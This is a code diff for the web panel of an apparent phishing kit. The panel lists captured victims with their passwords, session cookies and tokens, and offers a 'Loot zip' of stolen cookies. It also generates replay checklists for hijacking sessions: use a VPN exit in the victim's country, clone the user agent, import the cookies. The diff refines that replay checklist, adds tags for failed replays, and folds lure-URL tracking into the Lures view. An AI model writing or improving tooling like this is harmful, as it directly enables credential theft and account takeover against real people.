@@ -126,6 +126,8 @@
   tbody tr:hover td { background: #26221b; }
   tbody tr.sel td { background: #2c241c; box-shadow: inset 3px 0 0 var(--copper); }
   tbody tr.new td { background: #2a2618; }
+  tbody tr.fresh td { background: #262018; }
+  tbody tr.fresh.sel td { background: #2c241c; }
   .u { font-weight: 600; }
   .mut { color: var(--faint); }
   .num { font-family: var(--mono); font-variant-numeric: tabular-nums; font-size: 13px; }
@@ -142,7 +144,8 @@
   .st.replayed { color: var(--olive); }
   .st.bounced { color: var(--bad); }
   .st.done { color: var(--faint); }
-  .wf { display: flex; gap: 4px; flex-wrap: wrap; margin: 0 0 12px; }
+  .wf { display: flex; gap: 4px; flex-wrap: wrap; margin: 0 0 8px; }
+  .wf-bounce { display: flex; gap: 4px; flex-wrap: wrap; margin: 0 0 12px; }
 
   .inspector {
     border-top: 1px solid var(--line);
@@ -173,19 +176,35 @@
   .vstate { display: flex; align-items: center; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
   .vstate input.notes { flex: 1; min-width: 180px; background: var(--bg2); border: 1px solid var(--line); padding: 6px 8px; border-radius: 2px; }
   .empty-insp { color: var(--faint); padding: 24px 4px; }
-  .replay { border: 1px solid var(--line); border-left: 3px solid var(--copper); padding: 12px 14px; margin: 0 0 14px; background: var(--bg2); }
-  .replay h3 { margin: 0 0 6px; font-size: 14px; font-weight: 600; }
-  .replay .steps { margin: 8px 0 10px; padding-left: 18px; }
-  .replay .steps li { margin: 2px 0; }
-  .replay .warn { color: var(--bad); }
   .replay .hdr { font-family: var(--mono); font-size: 12px; word-break: break-all; background: var(--bg); border: 1px solid var(--line); padding: 6px 8px; margin-top: 3px; }
-  .replay .hint { color: var(--faint); font-size: 11px; }
+  .hint { color: var(--faint); font-size: 11px; }
   .fld { margin-top: 10px; }
   .fld .k { color: var(--faint); font-size: 12px; margin-bottom: 3px; }
   .fld .hdr { margin-top: 0; }
   .when .abs { display: block; color: var(--faint); font-size: 11px; font-family: var(--mono); font-weight: 400; }
+  .when.fresh { color: var(--copper); font-weight: 600; }
+  .cl { margin: 0 0 8px; padding: 0; list-style: none; counter-reset: step; }
+  .cl li {
+    display: grid; grid-template-columns: 22px 1fr auto; gap: 8px 10px;
+    align-items: start; padding: 8px 0; border-bottom: 1px solid var(--line);
+  }
+  .cl li::before { counter-increment: step; content: counter(step); color: var(--copper); font-family: var(--mono); font-size: 12px; padding-top: 2px; }
+  .cl .do { min-width: 0; }
+  .cl .host { font-weight: 600; }
+  .cl .warn { color: var(--bad); font-size: 12px; margin-top: 2px; }
+  .cl-copy { margin: 10px 0 6px; }
+  details.more { margin: 4px 0 14px; }
+  details.more summary { cursor: pointer; color: var(--mute); font-size: 13px; list-style: none; }
+  details.more summary::-webkit-details-marker { display: none; }
+  details.more summary:hover { color: var(--ink); }
+  details.more summary::before { content: "▸ "; font-family: var(--mono); color: var(--faint); }
+  details.more[open] summary::before { content: "▾ "; }
+  .strip { display: flex; gap: 28px; flex-wrap: wrap; padding: 2px 0 14px; margin-bottom: 10px; border-bottom: 1px solid var(--line); }
+  .strip b { font-family: var(--display); font-size: 20px; font-weight: 600; font-variant-numeric: tabular-nums; margin-right: 6px; }
+  .strip .l { color: var(--mute); font-size: 13px; }
+  .arrow { color: var(--faint); }
 
-  #urlsview, #settingsview, #luresview, #dashview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
+  #settingsview, #luresview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
   .dash-head { display: flex; align-items: flex-end; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 18px; }
   .dash-head h2 { margin: 0; font-size: 20px; font-weight: 600; }
   .dash-head .sub { margin: 4px 0 0; color: var(--mute); font-size: 13px; }
@@ -283,11 +302,9 @@
 </header>
 
 <nav class="rail">
-  <button type="button" data-tab="dash"></button>
   <button type="button" class="on" data-tab="victims"></button>
   <button type="button" data-tab="sessions"></button>
   <button type="button" data-tab="lures"></button>
-  <button type="button" data-tab="urls"></button>
   <button type="button" data-tab="settings"></button>
   <div class="hint">? keys</div>
 </nav>
@@ -310,8 +327,6 @@
     </div>
     <aside class="inspector" id="inspector"></aside>
   </div>
-  <div id="dashview" hidden></div>
-  <div id="urlsview" hidden></div>
   <div id="settingsview" hidden></div>
   <div id="luresview" hidden></div>
 </main>
@@ -334,7 +349,7 @@ const I18N = {
   en: {
     search_ph:"user, IP, token…", refresh:"Refresh", auto:"Live", loot:"Loot zip", csv:"CSV",
     loot_t:"Cookies of every replayable account", csv_t:"Masked session CSV for the report",
-    tab_dash:"Dashboard", tab_victims:"Inbox", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
+    tab_victims:"Inbox", tab_sessions:"Captures", tab_lures:"Lures", tab_settings:"Settings",
     domains:"Hosts", all_phishlets:"All phishlets", only_valid:"Replayable only", show_noise:"Include visits with no login",
     inbox_only:"Open only", th_status:"Status", th_from:"From",
     st_inbox:"open", st_copied:"open", st_replayed:"open", st_bounced:"bounced", st_done:"done",
@@ -370,6 +385,7 @@ const I18N = {
     minimal:"Don't put the account or IP in the message",
     save_btn:"Save", send_test:"Send test", token_saved:"saved — leave blank to keep",
     set_note:'1. @BotFather → /newbot → token.<br>2. Message the bot, open <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copy chat id.<br>3. Save, then send a test.',
+    set_tunnel:'If you close the panel, run <code>ghostloot</code> on your laptop. It opens the SSH tunnel to :8090 if it is down. It never kills an existing tunnel.',
     settings_saved:"Saved", test_sent:"Test sent", error:"Error",
     vstate_saved:"Saved", copied_paste:id=>`#${id} cookies on the clipboard. Cookie-Editor or StorageAce.`,
     new_sessions:n=>`${n} new capture(s)`, load_err:"Could not load",
@@ -381,16 +397,19 @@ const I18N = {
     ago:(n,u)=>`${n}${u} ago`,
     facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} open</b> · ${r} replayable · ${p} accounts · ${st} · ${last}`,
     help_title:"Keys",
-    help_items:[["/","search"],["1–6","views"],["j k","move"],["c","copy cookies"],["b","replay brief"],["h","Cookie header"],["u","done"],["e","bounced"],["?","this list"]],
+    help_items:[["/","search"],["1–4","views"],["j k","move"],["c","copy cookies"],["b","replay brief"],["h","Cookie header"],["u","done"],["e","bounced"],["?","this list"]],
+    bounce_ca:"CA", bounce_ip:"IP mismatch", bounce_ua:"UA", bounce_dead:"token dead",
+    visits_to:"visits → loot",
     tokens:"Tokens", password:"Password", copy_user:"Copy account",
     replay_title:"Replay (manual)", replay_match:"Match the victim",
-    replay_import:"Import cookies on", replay_then:"Then open", replay_avoid:"Do not use",
+    replay_import:"Import on", replay_then:"Then open", replay_avoid:"Do not use",
     replay_headers:"Headers to clone", replay_al:"Accept-Language", replay_suggested:"suggested from country — not captured",
     replay_captured:"captured", replay_copy_ua:"Copy UA", replay_copy_al:"Copy Accept-Language",
     replay_copy_hdr:"Copy Cookie header", replay_copy_brief:"Copy replay brief",
     replay_brief_copied:"Replay brief copied", replay_hdr_copied:"Cookie header copied",
     replay_geo_wait:"Country lookup pending…", replay_tz:"Timezone",
-    replay_vpn:"Use a VPN/exit in that country. Clone the UA. Do not replay from the VPS.",
+    replay_vpn:"VPN/exit in that country. Clone the UA. Do not replay from the VPS.",
+    replay_vpn_step:"VPN", replay_more:"More",
     geo_on:"GeoIP: ip-api.com (victim IPs, local cache)", geo_off:"GeoIP off",
     reveal_ph:"Click to show / hide",
     period_day:"Day", period_week:"Week", period_month:"Month",
@@ -405,7 +424,7 @@ const I18N = {
   es: {
     search_ph:"cuenta, IP, token…", refresh:"Actualizar", auto:"En vivo", loot:"Loot zip", csv:"CSV",
     loot_t:"Cookies de cada cuenta rejugable", csv_t:"CSV enmascarado para el informe",
-    tab_dash:"Dashboard", tab_victims:"Bandeja", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
+    tab_victims:"Bandeja", tab_sessions:"Capturas", tab_lures:"Lures", tab_settings:"Ajustes",
     domains:"Hosts", all_phishlets:"Todos los phishlets", only_valid:"Solo rejugables", show_noise:"Incluir visitas sin login",
     inbox_only:"Solo pendientes", th_status:"Estado", th_from:"Desde",
     st_inbox:"pendiente", st_copied:"pendiente", st_replayed:"pendiente", st_bounced:"rebotó", st_done:"hecha",
@@ -441,6 +460,7 @@ const I18N = {
     minimal:"No poner la cuenta ni la IP en el mensaje",
     save_btn:"Guardar", send_test:"Enviar test", token_saved:"guardado — vacío para no cambiarlo",
     set_note:'1. @BotFather → /newbot → token.<br>2. Escribe al bot, abre <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copia el chat id.<br>3. Guarda y envía un test.',
+    set_tunnel:'Si cierras el panel, ejecuta <code>ghostloot</code> en el portátil. Abre el túnel SSH a :8090 si está caído. No mata un túnel que ya exista.',
     settings_saved:"Guardado", test_sent:"Test enviado", error:"Error",
     vstate_saved:"Guardado", copied_paste:id=>`Cookies de #${id} en el portapapeles. Cookie-Editor o StorageAce.`,
     new_sessions:n=>`${n} captura(s) nueva(s)`, load_err:"No se pudo cargar",
@@ -452,16 +472,19 @@ const I18N = {
     ago:(n,u)=>`hace ${n}${u}`,
     facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} pendientes</b> · ${r} rejugables · ${p} cuentas · ${st} · ${last}`,
     help_title:"Teclas",
-    help_items:[["/","buscar"],["1–6","vistas"],["j k","mover"],["c","copiar cookies"],["b","briefing"],["h","cabecera Cookie"],["u","hecha"],["e","rebotó"],["?","esta lista"]],
+    help_items:[["/","buscar"],["1–4","vistas"],["j k","mover"],["c","copiar cookies"],["b","briefing"],["h","cabecera Cookie"],["u","hecha"],["e","rebotó"],["?","esta lista"]],
+    bounce_ca:"CA", bounce_ip:"IP distinta", bounce_ua:"UA", bounce_dead:"token muerta",
+    visits_to:"visitas → loot",
     tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
     replay_title:"Replay (manual)", replay_match:"Igualar a la víctima",
-    replay_import:"Importar cookies en", replay_then:"Luego abrir", replay_avoid:"No uses",
+    replay_import:"Importar en", replay_then:"Luego abrir", replay_avoid:"No uses",
     replay_headers:"Cabeceras a clonar", replay_al:"Accept-Language", replay_suggested:"sugerido por el país — no capturado",
     replay_captured:"capturado", replay_copy_ua:"Copiar UA", replay_copy_al:"Copiar Accept-Language",
     replay_copy_hdr:"Copiar cabecera Cookie", replay_copy_brief:"Copiar briefing de replay",
     replay_brief_copied:"Briefing copiado", replay_hdr_copied:"Cabecera Cookie copiada",
     replay_geo_wait:"Resolviendo país…", replay_tz:"Zona horaria",
     replay_vpn:"VPN/salida en ese país. Clona el UA. No rejugues desde el VPS.",
+    replay_vpn_step:"VPN", replay_more:"Más",
     geo_on:"GeoIP: ip-api.com (IPs de víctimas, cache local)", geo_off:"GeoIP off",
     reveal_ph:"Clic para ver / ocultar",
     period_day:"Día", period_week:"Semana", period_month:"Mes",
@@ -489,12 +512,30 @@ const state = {
   sel: null, rows: [], revealed: new Set(), period: 'week',
 };
 const STATUSES = ['inbox', 'bounced', 'done'];
+const BOUNCES = ['ca', 'ip', 'ua', 'dead'];
+const FRESH_SECS = 15 * 60;
 function victimStatus(user) {
   const st = (window._vstate || {})[String(user || '').toLowerCase()] || {};
   let s = st.status || (st.used ? 'done' : 'inbox');
   if (s === 'copied' || s === 'replayed') s = 'inbox';
   if (!STATUSES.includes(s)) s = 'inbox';
   return s;
+}
+function bounceOf(user) {
+  const st = (window._vstate || {})[String(user || '').toLowerCase()] || {};
+  const b = (st.bounce || '').toLowerCase();
+  return BOUNCES.includes(b) ? b : '';
+}
+function statusText(user) {
+  const st = victimStatus(user);
+  let txt = t('st_' + st);
+  const b = bounceOf(user);
+  if (st === 'bounced' && b) txt += ' · ' + t('bounce_' + b);
+  return txt;
+}
+function isFresh(ts) {
+  if (!ts) return false;
+  return (Date.now() / 1000 - ts) < FRESH_SECS;
 }
 function inInbox(v) {
   if (!v || !v.valid) return false;
@@ -515,7 +556,7 @@ function relTime(ts) {
 function absTime(ts) { if (!ts) return ''; return new Date(ts * 1000).toLocaleString(LANG === 'es' ? 'es-ES' : 'en-US'); }
 function whenCell(ts) {
   if (!ts) return '<span class="mut">—</span>';
-  return `<span class="when" title="${esc(absTime(ts))}">${relTime(ts)}<span class="abs">${esc(absTime(ts))}</span></span>`;
+  return `<span class="when${isFresh(ts) ? ' fresh' : ''}" title="${esc(absTime(ts))}">${relTime(ts)}<span class="abs">${esc(absTime(ts))}</span></span>`;
 }
 function toast(msg) { const el = $('#toast'); el.textContent = msg; el.classList.add('show'); clearTimeout(el._t); el._t = setTimeout(() => el.classList.remove('show'), 2200); }
 
@@ -579,38 +620,47 @@ function fromLine(s) {
   const bits = [cc, city, ua].filter(Boolean);
   return bits.length ? bits.join(' · ') : (s.remote_addr || '—');
 }
+function hostOf(u) { return String(u || '').replace(/^https?:\/\//, '').replace(/\/$/, ''); }
+function vpnLine(s) {
+  const g = (s && s.geo) || {};
+  const bits = [g.country_code || g.country, g.city, g.asn].filter(Boolean);
+  if (bits.length) return bits.join(' · ');
+  return (s && s.remote_addr) || t('replay_geo_wait');
+}
 function replayBox(s) {
   if (!s) return '';
   const r = s.replay || {};
-  const g = s.geo || {};
-  const loc = g.country ? locLine(s) : esc(s.remote_addr || t('replay_geo_wait'));
-  const net = [g.asn, g.isp].filter(Boolean).join(' · ');
-  return `<div class="replay">
-    <div class="u">${esc(r.label || '—')}${s.persistent ? ' · persist' : ''}</div>
-    <div class="v" style="margin:6px 0 10px">${loc}<br>${esc(r.ua_summary || '')}${net ? '<br><span class="mut">'+esc(net)+'</span>' : ''}</div>
-    <ol class="steps">
-      <li>${t('replay_import')} <b>${esc((r.import_on || '').replace(/^https:\/\//,''))}</b></li>
-      <li>${t('replay_then')} <b>${esc((r.then_open || '').replace(/^https:\/\//,''))}</b></li>
-      ${r.avoid ? `<li class="warn">${t('replay_avoid')} ${esc(r.avoid)}</li>` : ''}
-    </ol>
-    <div class="insp-actions" style="margin:4px 0 8px">
-      ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
+  return `<ol class="cl">
+    <li>
+      <div class="do">
+        <div class="u">${esc(t('replay_vpn_step'))}</div>
+        <div>${esc(vpnLine(s))}</div>
+        ${r.ua_summary ? `<div class="mut">${esc(r.ua_summary)}</div>` : ''}
+      </div>
       ${s.useragent ? `<button class="btn" data-copytext="${esc(s.useragent)}">${t('replay_copy_ua')}</button>` : ''}
-      ${r.accept_lang ? `<button class="btn" data-copytext="${esc(r.accept_lang)}">${t('replay_copy_al')}</button>` : ''}
-      ${s.cookies ? `<button class="btn" data-copyhdr="${s.id}">Cookie</button>` : ''}
+    </li>
+    <li>
+      <div class="do">${t('replay_import')} <span class="host">${esc(hostOf(r.import_on) || '—')}</span></div>
+    </li>
+    <li>
+      <div class="do">${t('replay_then')} <span class="host">${esc(hostOf(r.then_open) || '—')}</span>
+        ${r.avoid ? `<div class="warn">${t('replay_avoid')} ${esc(r.avoid)}</div>` : ''}
+      </div>
+    </li>
+  </ol>
+  <div class="cl-copy">${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}</div>
+  <details class="more">
+    <summary>${t('replay_more')}</summary>
+    ${s.useragent ? `<div class="fld"><div class="k">${t('useragent')} <span class="hint">(${t('replay_captured')})</span></div><div class="hdr">${esc(s.useragent)}</div></div>` : ''}
+    ${r.accept_lang ? `<div class="fld"><div class="k">${t('replay_al')} <span class="hint">(${t('replay_suggested')})</span></div><div class="hdr">${esc(r.accept_lang)}</div>
+      <button class="btn" style="margin-top:6px" data-copytext="${esc(r.accept_lang)}">${t('replay_copy_al')}</button></div>` : ''}
+    <div class="fld" style="display:flex;gap:8px;flex-wrap:wrap">
+      ${s.cookies ? `<button class="btn" data-copyhdr="${s.id}">${t('replay_copy_hdr')}</button>` : ''}
       <button class="btn" data-copybrief="${s.id}">${t('replay_copy_brief')}</button>
     </div>
-    <div class="fld">
-      <div class="k">${t('useragent')} <span class="hint">(${t('replay_captured')})</span></div>
-      <div class="hdr">${esc(s.useragent || '—')}</div>
-    </div>
-    ${r.accept_lang ? `<div class="fld">
-      <div class="k">${t('replay_al')} <span class="hint">(${t('replay_suggested')})</span></div>
-      <div class="hdr">${esc(r.accept_lang)}</div>
-    </div>` : ''}
     ${s.password ? `<div class="fld"><div class="k">${t('th_pass')}</div>${passCell(s.password, 's:' + s.id)}</div>` : ''}
     <div class="hint" style="margin-top:8px">${t('replay_vpn')}</div>
-  </div>`;
+  </details>`;
 }
 function ttlCell(s) {
   if (!s || !s.valid) return '<span class="mut">—</span>';
@@ -672,11 +722,9 @@ function applyStatic() {
   $('#csv').textContent = t('csv'); $('#csv').title = t('csv_t');
   $('#langbtn').textContent = LANG === 'en' ? 'ES' : 'EN';
   const setTab = (id, key) => { const el = document.querySelector('[data-tab="'+id+'"]'); if (el) el.textContent = t(key); };
-  setTab('dash', 'tab_dash');
   setTab('victims', 'tab_victims');
   setTab('sessions', 'tab_sessions');
   setTab('lures', 'tab_lures');
-  setTab('urls', 'tab_urls');
   setTab('settings', 'tab_settings');
   if ($('#fvalid_l')) $('#fvalid_l').textContent = t('only_valid');
   if ($('#fnoise_l')) $('#fnoise_l').textContent = t('show_noise');
@@ -755,13 +803,9 @@ function render() {
   const isTable = tab === 'victims' || tab === 'sessions';
   $('#toolbar').style.display = isTable ? '' : 'none';
   $('#stage').style.display = isTable ? '' : 'none';
-  $('#dashview').hidden = tab !== 'dash';
-  $('#urlsview').hidden = tab !== 'urls';
   $('#settingsview').hidden = tab !== 'settings';
   $('#luresview').hidden = tab !== 'lures';
   renderFacts();
-  if (tab === 'dash') { renderDash(); return; }
-  if (tab === 'urls') { renderUrls(); return; }
   if (tab === 'settings') { renderSettings(); return; }
   if (tab === 'lures') { renderLures(); return; }
   $('#fnoisewrap').style.display = tab === 'sessions' ? '' : 'none';
@@ -918,27 +962,98 @@ function renderDash() {
     </div>`;
 }
 
+function urlKey(u) { return String(u || '').replace(/\/+$/, '').toLowerCase(); }
+
+let luresInit = false;
 function renderLures() {
-  const m = new Map();
-  for (const s of (state.raw || [])) {
-    const u = s.landing || t('unknown');
-    let e = m.get(u); if (!e) { e = { url: u, visits: 0, valid: 0, users: new Set(), sessions: [] }; m.set(u, e); }
-    e.visits++; e.sessions.push(s); if (s.valid) e.valid++; if (s.username) e.users.add(s.username.toLowerCase());
+  const v = $('#luresview');
+  if (!luresInit) {
+    v.innerHTML =
+      `<div id="lurestrip"></div>
+       <div class="urlbar">
+         <input id="nu" placeholder="${t('url_ph')}" autocomplete="off">
+         <input id="nl" placeholder="${t('label_ph')}" autocomplete="off" style="max-width:160px;min-width:120px">
+         <button class="btn primary" id="addurl">${t('add')}</button>
+         <label class="chk"><input type="checkbox" id="onlyactive"> <span id="onlyactive_l">${t('active_only')}</span></label>
+         <button class="btn" id="copyactive">${t('copy_active')}</button>
+         <span class="count" id="urlcount"></span>
+       </div>
+       <div id="luretable"></div>`;
+    $('#addurl').onclick = addUrl;
+    $('#nu').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
+    $('#nl').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
+    $('#onlyactive').onchange = refreshLureTable;
+    $('#copyactive').onclick = copyActive;
+    luresInit = true;
   }
-  const rows = [...m.values()].sort((a, b) => b.valid - a.valid || b.visits - a.visits);
-  $('#luresview').innerHTML =
+  if ($('#nu')) $('#nu').placeholder = t('url_ph');
+  if ($('#nl')) $('#nl').placeholder = t('label_ph');
+  if ($('#addurl')) $('#addurl').textContent = t('add');
+  if ($('#copyactive')) $('#copyactive').textContent = t('copy_active');
+  if ($('#onlyactive_l')) $('#onlyactive_l').textContent = t('active_only');
+  renderLureStrip();
+  refreshLureTable();
+}
+function renderLureStrip() {
+  const el = $('#lurestrip'); if (!el) return;
+  const now = new Date();
+  el.innerHTML = '<div class="strip">' + ['day', 'week', 'month'].map(kind => {
+    const { start, end } = periodBounds(kind, now);
+    const cur = summarize(state.raw.filter(s => inRange(s.update || s.create, start, end)));
+    return `<div><b>${cur.captures}</b><span class="l">${t('dash_' + kind)} · ${cur.replayUsers} ${t('m_replay').toLowerCase()}</span></div>`;
+  }).join('') + '</div>';
+}
+async function refreshLureTable() {
+  let saved = [];
+  try { saved = await (await fetch('/api/urls')).json() || []; } catch (e) {}
+  window._urls = saved;
+  const by = new Map();
+  const take = (url) => {
+    const k = urlKey(url);
+    if (!k) return null;
+    let e = by.get(k);
+    if (!e) { e = { url, visits: 0, valid: 0, users: new Set(), sessions: [], saved: null }; by.set(k, e); }
+    return e;
+  };
+  for (const s of (state.raw || [])) {
+    if (!s.landing) continue;
+    const e = take(s.landing); if (!e) continue;
+    e.visits++; e.sessions.push(s);
+    if (s.valid) e.valid++;
+    if (s.username) e.users.add(s.username.toLowerCase());
+  }
+  for (const u of saved) {
+    const e = take(u.url); if (!e) continue;
+    e.saved = u;
+    if (u.label && !e.sessions.length) e.url = u.url;
+  }
+  const only = $('#onlyactive') && $('#onlyactive').checked;
+  let rows = [...by.values()];
+  if (only) rows = rows.filter(e => e.saved && e.saved.ok);
+  rows.sort((a, b) => b.valid - a.valid || b.visits - a.visits);
+  const list = $('#luretable'); if (!list) return;
+  list.innerHTML =
     `<table><thead><tr>
-       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th><th></th>
+       <th>${t('th_lure_id')}</th><th>${t('th_target')}</th><th>${t('visits_to')}</th><th></th><th></th>
      </tr></thead><tbody>` +
     (rows.length ? rows.map(e => {
-      const conv = e.visits ? Math.round(e.valid / e.visits * 100) : 0;
       const tgt = lureTarget(e.sessions);
+      const st = e.saved ? (e.saved.ok ? t('active') : t('down')) : '—';
+      const lab = e.saved && e.saved.label ? `<span class="lab">${esc(e.saved.label)}</span>` : '';
       return `<tr>
-        <td><div class="u">${esc(tgt.name)}</div>${tgt.detail ? `<div class="mut">${esc(tgt.detail)}</div>` : ''}<div class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</div></td>
-        <td class="num" style="color:var(--copper)">${esc(lureId(e.url))}</td>
-        <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td>
-        <td><button class="btn" data-copyurl="${esc(e.url)}">${t('copy')}</button></td></tr>`;
-    }).join('') : `<tr><td colspan="7" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
+        <td><div class="u" style="color:var(--copper)">${esc(lureId(e.url) || e.url)}</div>
+            <div class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</div>${lab}</td>
+        <td>${esc(tgt.name)}</td>
+        <td class="num">${e.visits} <span class="arrow">→</span> ${e.valid}</td>
+        <td style="color:${e.saved ? (e.saved.ok ? 'var(--olive)' : 'var(--bad)') : 'var(--faint)'}">${st}</td>
+        <td>
+          <button class="btn" data-copyurl="${esc(e.url)}">${t('copy')}</button>
+          ${e.saved ? `<button class="btn" data-delurl="${esc(e.saved.url)}">${t('delete')}</button>` : ''}
+        </td>
+      </tr>`;
+    }).join('') : `<tr><td colspan="5" class="empty">${only ? t('url_empty_active') : t('no_lures')}</td></tr>`) + `</tbody></table>`;
+  const act = saved.filter(u => u.ok).length;
+  if ($('#urlcount')) $('#urlcount').textContent = t('url_saved')(act, saved.length);
 }
 
 async function loadVState() { try { window._vstate = await (await fetch('/api/vstate')).json() || {}; } catch (e) { window._vstate = {}; } }
@@ -971,8 +1086,8 @@ function renderVictims() {
   $('#tbody').innerHTML = rows.length ? rows.map(v => {
     const st = victimStatus(v.username);
     const sel = state.sel && state.sel.type === 'victim' && state.sel.key === v.username.toLowerCase();
-    return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}">
-      <td class="u">${esc(v.username)} <span class="st ${st}">${t('st_' + st)}</span></td>
+    return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}${isFresh(v.lastUpdate) ? ' fresh' : ''}">
+      <td class="u">${esc(v.username)} <span class="st ${st}">${statusText(v.username)}</span></td>
       <td>${kindCell(v.best)}</td>
       <td>${passCell(v.password, 'v:' + v.username.toLowerCase())}</td>
       <td class="mut">${esc(fromLine(v.best))}</td>
@@ -999,7 +1114,7 @@ function renderSessions() {
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(s => {
     const sel = state.sel && state.sel.type === 'session' && state.sel.key === String(s.id);
-    return `<tr data-sel="session:${s.id}" class="${sel ? 'sel' : ''}${state.knownIds.size && !state.knownIds.has(s.id) ? ' new' : ''}">
+    return `<tr data-sel="session:${s.id}" class="${sel ? 'sel' : ''}${state.knownIds.size && !state.knownIds.has(s.id) ? ' new' : ''}${isFresh(s.update) ? ' fresh' : ''}">
       <td class="num">${s.id}</td>
       <td>${esc(s.username) || '<span class="mut">—</span>'}</td>
       <td>${kindCell(s)}</td>
@@ -1032,6 +1147,7 @@ function renderInspector() {
       <h2>${esc(v.username)}</h2>
       <p class="sub">${kindCell(b)} · ${ttlCell(b)}${b && b.token ? ' · '+esc(b.token) : ''}</p>
       <div class="wf">${STATUSES.map(s => `<button type="button" class="btn${victimStatus(v.username)===s?' on':''}" data-status="${s}" data-user="${esc(v.username)}">${t('st_'+s)}</button>`).join('')}</div>
+      <div class="wf-bounce">${BOUNCES.map(b => `<button type="button" class="btn${victimStatus(v.username)==='bounced'&&bounceOf(v.username)===b?' on':''}" data-bounce="${b}" data-user="${esc(v.username)}">${t('bounce_'+b)}</button>`).join('')}</div>
       ${b ? replayBox(b) : ''}
       <div class="meta-grid">
         <div><div class="k">${t('tokens')}</div><div class="v">${(b && b.tokens && b.tokens.length) ? b.tokens.map(esc).join(', ') : '—'}</div></div>
@@ -1077,9 +1193,10 @@ async function copyCookieHeader(id) {
     toast(t('replay_hdr_copied'));
   } catch (e) { toast(t('error') + ': ' + e); }
 }
-async function setVictimStatus(user, status, notes, quiet) {
+async function setVictimStatus(user, status, notes, quiet, bounce) {
   const cur = (window._vstate || {})[user.toLowerCase()] || {};
-  const body = new URLSearchParams({ user, status, notes: notes !== undefined ? notes : (cur.notes || '') });
+  const b = status === 'bounced' ? (bounce !== undefined ? bounce : (cur.bounce || '')) : '';
+  const body = new URLSearchParams({ user, status, bounce: b, notes: notes !== undefined ? notes : (cur.notes || '') });
   await fetch('/api/vstate', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body });
   await loadVState();
   if (!quiet) toast(t('vstate_saved'));
@@ -1115,7 +1232,8 @@ function renderSettings() {
        <div class="frow"><label>${t('chat_id')}</label><input type="text" id="s_chat" placeholder="12345678" autocomplete="off"></div>
        <label class="setchk"><input type="checkbox" id="s_min"> ${t('minimal')}</label>
        <div class="setbtns"><button class="btn primary" id="s_save">${t('save_btn')}</button><button class="btn" id="s_test">${t('send_test')}</button></div>
-       <p class="note">${t('set_note')}</p>`;
+       <p class="note">${t('set_note')}</p>
+       <p class="note">${t('set_tunnel')}</p>`;
     $('#s_save').onclick = saveSettings; $('#s_test').onclick = testTelegram; setInit = true;
   }
   loadSettingsForm();
@@ -1134,49 +1252,10 @@ async function saveSettings() {
 }
 async function testTelegram() { const r = await fetch('/api/test-telegram', { method: 'POST' }); if (r.ok) toast(t('test_sent')); else toast(t('error') + ': ' + (await r.text())); }
 
-let urlsInit = false;
-function renderUrls() {
-  const v = $('#urlsview');
-  if (!urlsInit) {
-    v.innerHTML =
-      `<div class="urlbar">
-         <input id="nu" placeholder="${t('url_ph')}" autocomplete="off">
-         <input id="nl" placeholder="${t('label_ph')}" autocomplete="off" style="max-width:160px;min-width:120px">
-         <button class="btn primary" id="addurl">${t('add')}</button>
-         <label class="chk"><input type="checkbox" id="onlyactive" checked> ${t('active_only')}</label>
-         <button class="btn" id="copyactive">${t('copy_active')}</button>
-         <span class="count" id="urlcount"></span>
-       </div><div id="urllist"></div>`;
-    $('#addurl').onclick = addUrl;
-    $('#nu').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
-    $('#nl').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
-    $('#onlyactive').onchange = refreshUrlList; $('#copyactive').onclick = copyActive; urlsInit = true;
-  }
-  refreshUrlList();
-}
-async function refreshUrlList() {
-  let arr = []; try { arr = await (await fetch('/api/urls')).json(); } catch (e) {}
-  window._urls = arr || [];
-  const only = $('#onlyactive') && $('#onlyactive').checked;
-  const rows = window._urls.filter(u => !only || u.ok);
-  const list = $('#urllist'); if (!list) return;
-  list.innerHTML = rows.length ? rows.map(u => `
-    <div class="urlrow">
-      <i class="dd" style="width:7px;height:7px;background:${u.ok ? 'var(--olive)' : 'var(--bad)'};display:inline-block"></i>
-      <span class="url" data-copyurl="${esc(u.url)}">${esc(u.url)}</span>
-      ${u.label ? `<span class="lab">${esc(u.label)}</span>` : ''}
-      <span class="sp"></span>
-      <span class="mut">${u.ok ? t('active') : t('down')}</span>
-      <button class="btn" data-copyurl="${esc(u.url)}">${t('copy')}</button>
-      <button class="btn" data-delurl="${esc(u.url)}">${t('delete')}</button>
-    </div>`).join('') : `<div class="empty">${only ? t('url_empty_active') : t('url_empty')}</div>`;
-  const act = window._urls.filter(u => u.ok).length;
-  if ($('#urlcount')) $('#urlcount').textContent = t('url_saved')(act, window._urls.length);
-}
 async function addUrl() {
   const u = $('#nu').value.trim(); if (!u) return; const l = $('#nl').value.trim();
